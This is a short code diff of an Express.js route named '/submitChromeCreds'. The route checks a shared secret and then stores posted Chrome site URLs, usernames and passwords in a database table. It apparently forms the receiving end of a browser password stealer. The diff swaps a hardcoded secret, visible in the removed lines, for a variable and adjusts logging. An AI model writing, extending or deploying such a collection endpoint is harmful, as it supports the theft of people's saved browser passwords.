@@ -10,10 +10,7 @@ router.post('/submitChromeCreds', function(req, res, next) {
     dataArray.push(el[1]);
   });
 
-  console.log(dataArray);
-  let recievedSecret = dataArray.shift();
-
-  if (recievedSecret == 'N&hm2$!J6C#fn98-wUds%9_uaCL8zYE%bGGUXJCkJUm@d') {
+  if (dataArray.shift() == dbSecret) {
     let ranStamp = Math.floor(Date.now() + Math.random());
     dataArray.forEach(function(el) {
       let query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
@@ -23,6 +20,7 @@ router.post('/submitChromeCreds', function(req, res, next) {
       });
     });
 
+    console.log("Added data to table", dataArray);
     res.sendStatus(200)
   } else {
     res.sendStatus(403);
